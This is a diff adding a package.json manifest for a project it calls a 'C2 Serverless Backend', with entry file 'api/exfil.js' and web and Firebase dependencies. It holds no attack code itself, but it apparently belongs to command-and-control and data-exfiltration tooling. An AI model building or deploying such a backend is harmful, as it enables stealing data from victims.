@@ -1,0 +1,13 @@
+{
+    "$schema": "https://json.schemastore.org/package",
+    "name": "bom-kaoskaki-v3",
+    "version": "3.0.0",
+    "description": "Bom-KaosKaki C2 Serverless Backend",
+    "main": "api/exfil.js",
+    "dependencies": {
+        "busboy": "^1.6.0",
+        "express": "^4.22.2",
+        "firebase-admin": "^11.11.0",
+        "node-fetch": "^2.7.0"
+    }
+}
